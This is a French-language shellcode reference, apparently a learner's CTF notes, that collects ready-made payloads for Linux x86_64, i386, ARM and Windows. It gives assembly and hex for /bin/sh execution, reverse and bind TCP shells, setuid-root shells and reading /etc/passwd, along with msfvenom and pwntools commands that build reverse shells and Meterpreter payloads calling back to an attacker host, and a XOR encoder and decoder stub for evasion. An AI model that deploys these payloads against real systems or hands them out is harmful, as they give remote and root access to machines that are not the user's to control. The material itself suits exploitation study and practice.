# Shellcodes Reference

> Collection de shellcodes utiles par architecture + ressources externes.
> Tous les shellcodes sont sans NULL bytes sauf mention contraire.

---

## 1. Linux x86_64 (amd64)

### 1.1 execve /bin/sh (27 bytes)

Le classique. Ouvre un shell interactif.

```nasm
global _start

section .text
_start:
    mov al, 59              ; execve syscall
    xor rdx, rdx            ; envp = NULL
    push rdx                ; null terminator
    mov rdi, '/bin//sh'     ; //sh pour remplir 8 bytes
    push rdi
    mov rdi, rsp            ; argv[0] = "/bin//sh"
    push rdx                ; argv terminator
    push rdi                ; argv[0]
    mov rsi, rsp            ; argv = ["/bin//sh", NULL]
    syscall
```

```
Shellcode : b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
```

### 1.2 execve /bin/sh - variante argv=NULL (26 bytes)

```nasm
section .text
_start:
    xor rsi, rsi            ; argv = NULL
    push rsi                ; null terminator
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp            ; rdi = "/bin//sh"
    xor rdx, rdx            ; envp = NULL
    push 59
    pop rax                 ; rax = 59 (execve)
    syscall
```

```
Shellcode : 4831f65648bf2f62696e2f2f736857 4889e74831d26a3b580f05
```

### 1.3 Reverse shell TCP (environ 74 bytes)

Se connecte à un attaquant. Remplacer IP/port.

```nasm
; Reverse shell - connect back to LHOST:LPORT
; Remplacer : 0x0100007f = 127.0.0.1 (little-endian)
;             0x5c11      = port 4444  (big-endian)

section .text
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rsi, rsi
    mul rsi                 ; rax=0, rdx=0
    push 41
    pop rax                 ; socket syscall
    push 2
    pop rdi                 ; AF_INET
    inc rsi                 ; SOCK_STREAM
    syscall

    ; connect(sockfd, addr, addrlen)
    xchg rdi, rax           ; sockfd
    mov al, 42              ; connect syscall
    mov rcx, 0xfeffff80a3eefffd  ; NOT encoded sockaddr (anti null-bytes)
    not rcx
    push rcx
    mov rsi, rsp            ; struct sockaddr *
    push 16
    pop rdx                 ; addrlen
    syscall

    ; dup2(sockfd, 0/1/2) - redirect stdin/stdout/stderr
    push 3
    pop rsi
.dup_loop:
    dec rsi
    push 33
    pop rax                 ; dup2 syscall
    syscall
    jnz .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rdx, rdx
    push rdx
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    push 59
    pop rax
    syscall
```

> **Note** : pour changer IP/port, encoder en NOT la struct sockaddr_in :
> `python3 -c "import struct; s = struct.pack('>HH4s', 2, 4444, bytes([127,0,0,1])); print(hex(~int.from_bytes(s.ljust(8,b'\x00'),'big') & 0xffffffffffffffff))"`

### 1.4 Bind shell TCP (environ 100 bytes)

Ouvre un port en écoute. Utile quand la cible n'a pas de firewall sortant.

```nasm
section .text
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rsi, rsi
    mul rsi
    push 41
    pop rax
    push 2
    pop rdi
    inc rsi
    syscall

    xchg rdi, rax           ; sockfd

    ; bind(sockfd, addr, 16)
    push rdx                ; sin_addr = 0.0.0.0 (INADDR_ANY)
    push word 0x5c11        ; port 4444 (big-endian)
    push word 2             ; AF_INET
    mov rsi, rsp
    push 16
    pop rdx
    push 49
    pop rax                 ; bind syscall
    syscall

    ; listen(sockfd, 0)
    xor rsi, rsi
    push 50
    pop rax
    syscall

    ; accept(sockfd, NULL, NULL)
    xor rsi, rsi
    xor rdx, rdx
    push 43
    pop rax
    syscall

    xchg rdi, rax           ; client sockfd

    ; dup2 loop
    push 3
    pop rsi
.dup:
    dec rsi
    push 33
    pop rax
    syscall
    jnz .dup

    ; execve("/bin/sh", NULL, NULL)
    xor rdx, rdx
    push rdx
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    push 59
    pop rax
    syscall
```

### 1.5 Read file (/etc/passwd) (environ 82 bytes)

Lit et affiche un fichier sur stdout.

```nasm
section .text
_start:
    ; open("/etc/passwd", O_RDONLY)
    xor rsi, rsi            ; O_RDONLY = 0
    mul rsi                 ; rax=0, rdx=0
    push rax                ; null terminator
    xor rbx, rbx
    mov bx, 'wd'            ; 2 bytes -> registre 16-bit (pas de padding)
    push rbx
    mov rbx, '/etc/pass'
    push rbx
    mov rdi, rsp
    push 2
    pop rax                 ; open syscall
    syscall

    ; read(fd, buf, 4096)
    xchg rdi, rax           ; fd
    xor rcx, rcx
    mov ch, 0x10             ; rcx = 0x1000 (4096) sans NULL bytes
    sub rsp, rcx             ; buffer sur la stack
    mov rsi, rsp
    mov dx, 0x0fff          ; count = 4095 (évite null)
    xor rax, rax            ; read syscall = 0
    syscall

    ; write(1, buf, bytes_read)
    mov rdx, rax            ; bytes lus
    xor rdi, rdi
    inc rdi                 ; stdout
    mov rsi, rsp
    push 1
    pop rax                 ; write syscall
    syscall

    ; exit(0)
    xor rdi, rdi
    push 60
    pop rax
    syscall
```

### 1.6 setuid(0) + execve /bin/sh (37 bytes)

Utile après exploitation d'un binaire SUID pour obtenir un shell root.

```nasm
section .text
_start:
    ; setuid(0)
    xor rdi, rdi
    push 105
    pop rax
    syscall

    ; execve("/bin/sh")
    xor rdx, rdx
    push rdx
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    push 59
    pop rax
    syscall
```

### 1.7 Write message + exit (stub template)

Template de base pour écrire un message et sortir proprement.

```nasm
section .text
_start:
    ;--- Construire la chaîne sur la stack ---
    xor rbx, rbx
    mov bx, 'y!'
    push rbx
    mov rbx, 'B Academ'
    push rbx
    mov rbx, 'Hello HT'
    push rbx
    mov rsi, rsp

    ;--- write(1, msg, len) ---
    xor rax, rax
    mov al, 1
    xor rdi, rdi
    mov dil, 1
    xor rdx, rdx
    mov dl, 18
    syscall

    ;--- exit(0) ---
    xor rax, rax
    add al, 60
    xor dil, dil
    syscall
```

---

## 2. Linux x86 (i386, 32-bit)

> Syscalls via `int 0x80`. Arguments dans `eax`, `ebx`, `ecx`, `edx`, `esi`, `edi`.

### 2.1 execve /bin/sh (23 bytes)

```nasm
section .text
_start:
    xor ecx, ecx            ; argv = NULL
    mul ecx                  ; eax=0, edx=0
    push ecx                 ; null terminator
    push 0x68732f2f          ; "//sh"
    push 0x6e69622f          ; "/bin"
    mov ebx, esp             ; ebx = "/bin//sh"
    mov al, 11               ; execve = 11
    int 0x80
```

```
Shellcode : 31c9f7e15168732f2f68696e622f89e3b00bcd80
```

### 2.2 Reverse shell TCP (68 bytes)

```nasm
section .text
_start:
    ; socket(2, 1, 0)
    xor ebx, ebx
    mul ebx                  ; eax=0, edx=0
    push ebx                 ; protocol = 0
    inc ebx                  ; SOCK_STREAM
    push ebx
    push 2                   ; AF_INET
    mov ecx, esp
    mov al, 102              ; socketcall
    mov bl, 1                ; SYS_SOCKET
    int 0x80

    xchg edi, eax            ; sockfd

    ; connect(sockfd, addr, 16)
    ; IP 127.0.0.1 via NOT (évite les NULL bytes)
    mov ebx, ~0x0100007f     ; NOT de l'IP (modifier ici)
    not ebx
    push ebx
    push word 0x5c11         ; port 4444 (modifier ici)
    push word 2              ; AF_INET
    mov ecx, esp
    push 16
    push ecx
    push edi
    mov ecx, esp
    mov al, 102
    mov bl, 3                ; SYS_CONNECT
    int 0x80

    ; dup2 loop
    xchg ebx, edi
    xor ecx, ecx
    mov cl, 3
.dup:
    dec ecx
    mov al, 63               ; dup2
    int 0x80
    jnz .dup

    ; execve("/bin/sh")
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
```

### 2.3 Bind shell TCP

```nasm
section .text
_start:
    ; socket(2, 1, 0)
    xor ebx, ebx
    mul ebx
    push ebx
    inc ebx
    push ebx
    push 2
    mov ecx, esp
    mov al, 102              ; socketcall
    mov bl, 1                ; SYS_SOCKET
    int 0x80

    xchg edi, eax

    ; bind
    push edx                 ; INADDR_ANY
    push word 0x5c11         ; port 4444
    push word 2              ; AF_INET
    mov ecx, esp
    push 16
    push ecx
    push edi
    mov ecx, esp
    mov al, 102
    mov bl, 2                ; SYS_BIND
    int 0x80

    ; listen
    push edx
    push edi
    mov ecx, esp
    mov al, 102
    mov bl, 4                ; SYS_LISTEN
    int 0x80

    ; accept
    push edx
    push edx
    push edi
    mov ecx, esp
    mov al, 102
    mov bl, 5                ; SYS_ACCEPT
    int 0x80

    xchg ebx, eax

    ; dup2 loop
    xor ecx, ecx
    mov cl, 3
.dup:
    dec ecx
    mov al, 63
    int 0x80
    jnz .dup

    ; execve
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
```

---

## 3. Linux ARM64 (aarch64)

> Syscalls via `svc #0`. Arguments dans `x0`-`x5`, numéro dans `x8`.

### 3.1 execve /bin/sh (44 bytes)

```asm
.text
.global _start
_start:
    // execve("/bin/sh", NULL, NULL)
    mov x2, xzr              // envp = NULL
    mov x1, xzr              // argv = NULL
    adr x0, shell             // x0 = &"/bin/sh"
    mov x8, #221              // execve syscall
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes

shell:
    .ascii "/bin/sh\0"
```

> **Note** : contient un NULL byte dans la chaîne. Pour un shellcode injectable,
> utiliser la technique XOR ou la construction sur la stack.

### 3.2 execve /bin/sh - null-free (environ 48 bytes)

```asm
.text
.global _start
_start:
    mov x2, xzr              // envp = NULL
    mov x1, xzr              // argv = NULL

    // Construire "/bin/sh" sur la stack
    mov x3, #0x622f           // "/b"
    movk x3, #0x6e69, lsl #16 // "in"
    movk x3, #0x732f, lsl #32 // "/s"
    movk x3, #0x68, lsl #48   // "h"
    str x3, [sp, #-16]!
    mov x0, sp

    mov x8, #221              // execve
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
```

### 3.3 Reverse shell TCP

```asm
.text
.global _start
_start:
    // socket(AF_INET, SOCK_STREAM, 0)
    mov x0, #2
    mov x1, #1
    mov x2, xzr
    mov x8, #198              // socket
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
    mov x12, x0               // save sockfd

    // connect - struct sockaddr_in sur la stack
    mov x1, #0x5c11           // port 4444
    movk x1, #0x2, lsl #16   // AF_INET
    // IP: 127.0.0.1
    mov x3, #0x007f
    movk x3, #0x0001, lsl #16
    stp x1, x3, [sp, #-16]!

    mov x0, x12
    mov x1, sp
    mov x2, #16
    mov x8, #203              // connect
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes

    // dup2 loop
    mov x1, #3
dup_loop:
    sub x1, x1, #1
    mov x0, x12
    mov x8, #24               // dup3 (on aarch64)
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
    cbnz x1, dup_loop

    // execve
    mov x2, xzr
    mov x1, xzr
    mov x3, #0x622f
    movk x3, #0x6e69, lsl #16
    movk x3, #0x732f, lsl #32
    movk x3, #0x68, lsl #48
    str x3, [sp, #-16]!
    mov x0, sp
    mov x8, #221
    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
```

---

## 4. Linux ARM32

> Syscalls via `svc #0`. Arguments dans `r0`-`r6`, numéro dans `r7`.
> Utiliser le mode Thumb pour des shellcodes plus compacts.

### 4.1 execve /bin/sh - Thumb mode (27 bytes)

```asm
.syntax unified
.thumb
.global _start
_start:
    add r3, pc, #1
    bx  r3

.thumb_func
thumb:
    eor r2, r2               // envp = NULL
    eor r1, r1               // argv = NULL
    adr r0, shell
    strb r2, [r0, #7]        // null-terminate (runtime)
    mov r7, #11               // execve
    svc #1

shell:
    .ascii "/bin/shX"         // X sera remplacé par \0
```

---

## 5. Windows x64

> Syscalls indirects via `ntdll.dll`. Plus complexe que Linux car les numéros changent entre versions.
> En pratique, on appelle les API Win32 via le PEB/IAT.

### 5.1 WinExec("calc.exe") - concept

```nasm
; Pseudo-code - nécessite de résoudre les adresses dynamiquement
; via le PEB -> InLoadOrderModuleList -> kernel32.dll -> GetProcAddress

; 1. Trouver kernel32.dll base via PEB
;    mov rax, gs:[0x60]        ; PEB
;    mov rax, [rax+0x18]       ; PEB->Ldr
;    mov rax, [rax+0x20]       ; InMemoryOrderModuleList
;    mov rax, [rax]             ; ntdll
;    mov rax, [rax]             ; kernel32
;    mov rax, [rax+0x20]       ; DllBase

; 2. Parser l'export table pour trouver WinExec
; 3. Appeler WinExec("calc.exe", 0)
```

> Les shellcodes Windows sont plus longs car il faut résoudre les adresses API
> dynamiquement. Utiliser `msfvenom` pour les générer en pratique.

---

## 6. Génération automatique

### 6.1 pwntools shellcraft

```bash
# Lister tous les shellcodes disponibles
pwn shellcraft -l 'amd64.linux'
pwn shellcraft -l 'i386.linux'
pwn shellcraft -l 'arm.linux'
pwn shellcraft -l 'aarch64.linux'

# Générer et afficher le code ASM
pwn shellcraft amd64.linux.sh
pwn shellcraft amd64.linux.connect 127.0.0.1 4444
pwn shellcraft i386.linux.sh

# Générer le shellcode hex
pwn shellcraft amd64.linux.sh -f hex

# Exécuter directement
pwn shellcraft amd64.linux.sh -r

# Enchaîner des shellcodes
pwn shellcraft amd64.linux.setreuid 0 -- amd64.linux.sh
```

### 6.2 msfvenom

```bash
# --- Linux x64 ---
# exec /bin/sh
msfvenom -p linux/x64/exec CMD=sh -f hex

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex

# Bind shell
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f hex

# Meterpreter reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex

# --- Linux x86 ---
msfvenom -p linux/x86/exec CMD=sh -f hex
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex

# --- Linux ARM ---
msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex

# --- Windows x64 ---
msfvenom -p windows/x64/exec CMD=calc.exe -f hex
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hex

# --- Options utiles ---
# -f hex|raw|python|c|elf|exe    : format de sortie
# -e x64/xor                     : encodage (bypass basique)
# -b '\x00'                      : bad chars à éviter
# -n 16                          : NOP sled de 16 bytes
# --smallest                     : optimiser la taille
```

---

## 7. Encodage et évasion basique

### 7.1 XOR encoder (Python)

```python
#!/usr/bin/python3
"""Encode un shellcode avec XOR pour éviter les bad chars."""
import sys

def xor_encode(shellcode_hex, key):
    sc = bytes.fromhex(shellcode_hex)
    encoded = bytes([b ^ key for b in sc])

    # Vérifier que la clé elle-même ne produit pas de bad char
    if b'\x00' in encoded:
        print(f"[!] La clé 0x{key:02x} produit des NULL bytes, essayer une autre clé")
        return None

    print(f"[+] Original  : {sc.hex()}")
    print(f"[+] Encoded   : {encoded.hex()}")
    print(f"[+] Key       : 0x{key:02x}")
    print(f"[+] Size      : {len(sc)} bytes")
    return encoded.hex()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 xor_encoder.py <shellcode_hex> <key_hex>")
        print("Exemple: python3 xor_encoder.py 'b03b4831d2...' 'aa'")
        sys.exit(1)
    xor_encode(sys.argv[1], int(sys.argv[2], 16))
```

### 7.2 Stub décodeur XOR (x86_64)

À prépendre au shellcode encodé :

```nasm
section .text
_start:
    jmp get_shellcode

decoder:
    pop rsi                  ; adresse du shellcode
    xor rcx, rcx
    mov cl, SHELLCODE_LEN    ; longueur (< 256)

decode_loop:
    xor byte [rsi], XOR_KEY  ; clé XOR
    inc rsi
    loop decode_loop

    jmp get_shellcode + 5    ; sauter au shellcode décodé

get_shellcode:
    call decoder
    ; Le shellcode encodé suit ici
```

---

## 8. Numéros de syscalls - référence rapide

### Linux x86_64

| Syscall | Numéro (`rax`) | `rdi` | `rsi` | `rdx` |
|---------|---------------|-------|-------|-------|
| read | 0 | fd | buf | count |
| write | 1 | fd | buf | count |
| open | 2 | filename | flags | mode |
| close | 3 | fd | | |
| mmap | 9 | addr | len | prot |
| mprotect | 10 | addr | len | prot |
| dup2 | 33 | oldfd | newfd | |
| socket | 41 | domain | type | protocol |
| connect | 42 | sockfd | addr | addrlen |
| accept | 43 | sockfd | addr | addrlen |
| bind | 49 | sockfd | addr | addrlen |
| listen | 50 | sockfd | backlog | |
| fork | 57 | | | |
| execve | 59 | filename | argv | envp |
| exit | 60 | code | | |
| kill | 62 | pid | sig | |
| setuid | 105 | uid | | |
| setreuid | 113 | ruid | euid | |

### Linux x86 (i386)

| Syscall | Numéro (`eax`) | `ebx` | `ecx` | `edx` |
|---------|---------------|-------|-------|-------|
| exit | 1 | code | | |
| fork | 2 | | | |
| read | 3 | fd | buf | count |
| write | 4 | fd | buf | count |
| open | 5 | filename | flags | mode |
| close | 6 | fd | | |
| execve | 11 | filename | argv | envp |
| dup2 | 63 | oldfd | newfd | |
| socketcall | 102 | call | args | |
| setuid | 23 | uid | | |

---

## 9. Ressources externes

### Bases de données de shellcodes

| Ressource | URL | Description |
|-----------|-----|-------------|
| **Shell-Storm** | http://shell-storm.org/shellcode/ | Base de données de shellcodes multi-arch |
| **Exploit-DB Shellcodes** | https://www.exploit-db.com/shellcodes | Shellcodes classés par plateforme |
| **Packet Storm** | https://packetstormsecurity.com/files/tags/shellcode/ | Collection de shellcodes |

### Outils en ligne

| Outil | URL | Description |
|-------|-----|-------------|
| **Defuse Online x86 Assembler** | https://defuse.ca/online-x86-assembler.htm | Assembler/désassembler en ligne |
| **Godbolt Compiler Explorer** | https://godbolt.org/ | Voir le code ASM généré par un compilateur |
| **Syscall Table** | https://syscalls.mebeim.net/ | Table interactive des syscalls Linux (toutes arch) |
| **x86 Reference** | https://www.felixcloutier.com/x86/ | Référence complète des instructions x86 |

### Documentation et apprentissage

| Ressource | URL | Description |
|-----------|-----|-------------|
| **Linux Syscall Reference** | https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ | Table syscalls x86_64 |
| **Shellcoding for Linux (Exploit-DB)** | https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf | Tutoriel complet |
| **pwntools docs** | https://docs.pwntools.com/en/stable/shellcraft.html | Documentation shellcraft |
| **NASM Manual** | https://www.nasm.us/xdoc/2.16.03/html/nasmdoc0.html | Référence NASM officielle |
| **Intel x86 Manuals** | https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html | Référence Intel officielle |

### Cheatsheets

| Ressource | URL | Description |
|-----------|-----|-------------|
| **x86_64 Syscall Table** | https://filippo.io/linux-syscall-table/ | Table interactive des syscalls |
| **ARM64 Syscall Table** | https://arm64.syscall.sh/ | Syscalls Linux aarch64 |
| **x86 Assembly Guide** | https://www.cs.virginia.edu/~evans/cs216/guides/x86.html | Guide rapide x86 |

### CTF et pratique

| Ressource | URL | Description |
|-----------|-----|-------------|
| **pwnable.kr** | http://pwnable.kr/ | Challenges exploitation/shellcoding |
| **pwnable.tw** | https://pwnable.tw/ | Challenges exploitation avancés |
| **Exploit Education** | https://exploit.education/ | VMs pour apprendre l'exploitation |
| **ROP Emporium** | https://ropemporium.com/ | Challenges ROP progressifs |
| **HTB Academy** | https://academy.hackthebox.com/ | Module Intro to Assembly Language |

---

## 10. Tips pratiques

### Vérifier un shellcode rapidement

```bash
# Tester avec pwntools (une ligne)
python3 -c "from pwn import *; context(os='linux',arch='amd64',log_level='error'); run_shellcode(unhex('SHELLCODE_HEX')).interactive()"

# Désassembler pour review
pwn disasm 'SHELLCODE_HEX' -c 'amd64'

# Vérifier les bad chars
python3 -c "sc=bytes.fromhex('SHELLCODE_HEX'); bad=[hex(i) for i,b in enumerate(sc) if b==0]; print(f'NULL bytes at: {bad}' if bad else 'Clean!')"
```

### Convertir une IP/port pour shellcode

```bash
# IP en little-endian hex (pour struct sockaddr_in)
python3 -c "import socket,struct; print(struct.pack('<I', int.from_bytes(socket.inet_aton('10.10.14.1'),'big')).hex())"

# Port en big-endian hex
python3 -c "import struct; print(struct.pack('>H', 4444).hex())"
```

### Chaîne en hex pour push (little-endian, 8 bytes par registre)

```bash
python3 -c "
s = '/bin//sh'
for i in range(0, len(s), 8):
    chunk = s[i:i+8]
    print(f\"mov rbx, '{chunk}'  ; {chunk.encode().hex()}\")
"
```

---
